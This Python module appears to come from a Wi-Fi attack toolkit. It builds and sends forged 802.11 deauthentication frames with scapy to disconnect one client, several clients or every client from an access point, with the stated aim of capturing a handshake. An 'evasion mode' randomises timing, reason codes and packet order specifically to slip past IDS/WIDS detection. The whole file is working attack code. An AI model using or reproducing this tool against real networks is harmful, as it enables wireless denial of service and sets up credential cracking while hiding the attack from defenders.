"""Deauthentication attack module - sends deauth frames to force client reconnection."""

import time
import random
import threading

from scapy.all import (
    Dot11, Dot11Deauth, RadioTap, sendp
)

from config import (
    DEAUTH_COUNT, DEAUTH_INTERVAL, DEAUTH_BURSTS,
    DEAUTH_JITTER_MIN, DEAUTH_JITTER_MAX,
    DEAUTH_BURST_JITTER_MIN, DEAUTH_BURST_JITTER_MAX,
)
from utils import print_status, print_success, print_warning, print_info, Colors

# Deauth reason codes - rotating through these avoids signature detection
DEAUTH_REASONS = [
    1,   # Unspecified reason
    4,   # Disassociated due to inactivity
    5,   # Disassociated because AP is unable to handle all currently associated STAs
    7,   # Class 3 frame received from nonassociated STA
    8,   # Disassociated because sending STA is leaving (or has left) BSS
]


class DeauthAttack:
    """Sends deauthentication frames to disconnect clients from an AP.

    Supports an evasion mode that randomizes timing, reason codes, and
    packet ordering to avoid IDS/WIDS signature detection.
    """

    def __init__(self, interface, bssid, client=None, evasion=False):
        """
        Args:
            interface: Monitor mode interface to send from.
            bssid: Target AP's BSSID (MAC address).
            client: Specific client MAC to deauth. If None, broadcast deauth.
            evasion: Enable IDS evasion (jitter, reason rotation, random ordering).
        """
        self.interface = interface
        self.bssid = bssid
        self.client = client or "ff:ff:ff:ff:ff:ff"  # Broadcast if no specific client
        self.evasion = evasion
        self._stop_event = threading.Event()
        self._thread = None
        self.packets_sent = 0

    def _build_deauth_packet(self, reason=7):
        """Craft a deauthentication packet.

        Args:
            reason: Deauth reason code (default 7).
        """
        # Deauth from AP to client
        pkt1 = (
            RadioTap() /
            Dot11(
                type=0, subtype=12,
                addr1=self.client,      # Destination (client or broadcast)
                addr2=self.bssid,       # Source (AP)
                addr3=self.bssid        # BSSID
            ) /
            Dot11Deauth(reason=reason)
        )

        # Deauth from client to AP (if targeted)
        pkt2 = (
            RadioTap() /
            Dot11(
                type=0, subtype=12,
                addr1=self.bssid,       # Destination (AP)
                addr2=self.client,      # Source (client)
                addr3=self.bssid        # BSSID
            ) /
            Dot11Deauth(reason=reason)
        )

        return pkt1, pkt2

    def _get_delay(self, base_interval):
        """Get delay between packets, with optional jitter for evasion."""
        if self.evasion:
            jitter = random.uniform(DEAUTH_JITTER_MIN, DEAUTH_JITTER_MAX)
            return base_interval + jitter
        return base_interval

    def _get_burst_delay(self):
        """Get delay between bursts, with optional jitter for evasion."""
        if self.evasion:
            return random.uniform(DEAUTH_BURST_JITTER_MIN, DEAUTH_BURST_JITTER_MAX)
        return 0.5

    def _get_reason(self):
        """Get deauth reason code, rotating if evasion enabled."""
        if self.evasion:
            return random.choice(DEAUTH_REASONS)
        return 7

    def _send_loop(self, count, interval, bursts):
        """Send deauth packets in bursts."""
        target_str = self.client if self.client != "ff:ff:ff:ff:ff:ff" else "broadcast"
        evasion_str = " (evasion mode)" if self.evasion else ""

        print_status(
            f"Sending deauth: AP={self.bssid} -> Target={target_str} "
            f"({count} pkts x {bursts} bursts){evasion_str}"
        )

        if self.evasion:
            print_info("  Evasion: random jitter, rotating reason codes, random burst gaps")

        for burst in range(bursts):
            if self._stop_event.is_set():
                break

            print(f"  {Colors.YELLOW}Burst {burst + 1}/{bursts}{Colors.RESET}", end="\r")

            # In evasion mode, randomize packets per burst slightly
            actual_count = count
            if self.evasion:
                actual_count = random.randint(max(1, count - 10), count + 10)

            for _ in range(actual_count):
                if self._stop_event.is_set():
                    break

                # Rotate reason code in evasion mode
                reason = self._get_reason()
                pkt1, pkt2 = self._build_deauth_packet(reason=reason)

                try:
                    # In evasion mode, occasionally swap send order
                    if self.evasion and random.random() < 0.3:
                        if self.client != "ff:ff:ff:ff:ff:ff":
                            sendp(pkt2, iface=self.interface, verbose=False)
                        sendp(pkt1, iface=self.interface, verbose=False)
                    else:
                        sendp(pkt1, iface=self.interface, verbose=False)
                        if self.client != "ff:ff:ff:ff:ff:ff":
                            sendp(pkt2, iface=self.interface, verbose=False)

                    self.packets_sent += 1
                except OSError as e:
                    # Interface may not be ready yet, wait and retry
                    print_warning(f"Send error: {e} - retrying in 2s...")
                    time.sleep(2)
                    continue

                time.sleep(self._get_delay(interval))

            # Pause between bursts
            if not self._stop_event.is_set() and burst < bursts - 1:
                time.sleep(self._get_burst_delay())

        print()
        print_success(f"Deauth complete. {self.packets_sent} packets sent.")

    def start(self, count=None, interval=None, bursts=None, blocking=True):
        """Start the deauth attack.

        Args:
            count: Packets per burst (default: DEAUTH_COUNT).
            interval: Seconds between packets (default: DEAUTH_INTERVAL).
            bursts: Number of bursts (default: DEAUTH_BURSTS).
            blocking: If True, block until done. If False, run in background thread.
        """
        count = count or DEAUTH_COUNT
        interval = interval or DEAUTH_INTERVAL
        bursts = bursts or DEAUTH_BURSTS
        self._stop_event.clear()
        self.packets_sent = 0

        if blocking:
            self._send_loop(count, interval, bursts)
        else:
            self._thread = threading.Thread(
                target=self._send_loop,
                args=(count, interval, bursts),
                daemon=True
            )
            self._thread.start()

    def stop(self):
        """Stop the deauth attack."""
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)
        print_warning("Deauth attack stopped.")

    def is_running(self):
        """Check if the attack is still running."""
        return self._thread is not None and self._thread.is_alive()


class MultiClientDeauth:
    """Sends deauth frames to ALL connected clients of an AP.

    Instead of targeting just one client (or broadcast), this iterates
    through all known clients and deauths each one individually.
    This increases the chance of capturing a handshake.
    """

    def __init__(self, interface, bssid, clients):
        """
        Args:
            interface: Monitor mode interface.
            bssid: Target AP BSSID.
            clients: List/set of client MAC addresses.
        """
        self.interface = interface
        self.bssid = bssid
        self.clients = list(clients) if clients else []
        self._attacks = []
        self._stop_event = threading.Event()
        self.total_packets = 0

    def start(self, count=None, interval=None, bursts=None, blocking=True):
        """Deauth all clients sequentially.

        Args:
            count: Packets per burst per client.
            interval: Seconds between packets.
            bursts: Number of bursts per client.
            blocking: Block until done.
        """
        if not self.clients:
            print_warning("No clients to deauth. Using broadcast.")
            attack = DeauthAttack(self.interface, self.bssid, client=None)
            attack.start(count=count, interval=interval, bursts=bursts, blocking=blocking)
            self.total_packets = attack.packets_sent
            return

        print_status(f"Multi-client deauth: {len(self.clients)} clients")

        for i, client_mac in enumerate(self.clients, 1):
            if self._stop_event.is_set():
                break

            print_status(f"  Client {i}/{len(self.clients)}: {client_mac}")
            attack = DeauthAttack(self.interface, self.bssid, client=client_mac)
            self._attacks.append(attack)
            attack.start(
                count=count or DEAUTH_COUNT,
                interval=interval or DEAUTH_INTERVAL,
                bursts=max(1, (bursts or DEAUTH_BURSTS) // len(self.clients)),
                blocking=blocking
            )
            self.total_packets += attack.packets_sent

        # Also send a broadcast deauth as fallback
        if not self._stop_event.is_set():
            print_status("  Sending broadcast deauth as well...")
            broadcast = DeauthAttack(self.interface, self.bssid, client=None)
            broadcast.start(count=count or DEAUTH_COUNT,
                           interval=interval or DEAUTH_INTERVAL,
                           bursts=1, blocking=blocking)
            self.total_packets += broadcast.packets_sent

        print_success(f"Multi-client deauth complete. {self.total_packets} total packets sent.")

    def stop(self):
        """Stop all deauth attacks."""
        self._stop_event.set()
        for attack in self._attacks:
            attack.stop()
